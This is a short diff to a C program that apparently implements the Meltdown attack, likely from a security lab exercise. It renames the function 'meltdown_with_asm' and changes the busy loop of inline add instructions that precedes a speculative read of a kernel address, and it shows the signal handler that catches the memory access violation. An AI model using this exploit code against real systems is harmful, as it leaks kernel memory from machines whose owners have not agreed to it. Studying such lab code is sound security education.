@@ -94,12 +94,12 @@ int meltdown(unsigned long kernel_addr){
 }
 
 //Improve the attack with arithmetic instruction
-void meltdown_with_asm(unsigned long kernel_addr){
+void meltdown_busy_loop(unsigned long kernel_addr){
     char kernel_data;
 
     asm volatile(
-        ".rept 400;"
-        "add $0x141, %%eax;"
+        ".rept 1000;"
+        "add $0x01, %%eax;"
         ".endr;"
         
         :
@@ -128,7 +128,7 @@ int main(){
     if(sigsetjmp(jbuf, 1)==0)
     {
         meltdown(kernel_addr);
-       // meltdown_with_asm(kernel_addr);
+       // meltdown_busy_loop(kernel_addr);
     }
     else{
         printf("Memory Access Violation\n");
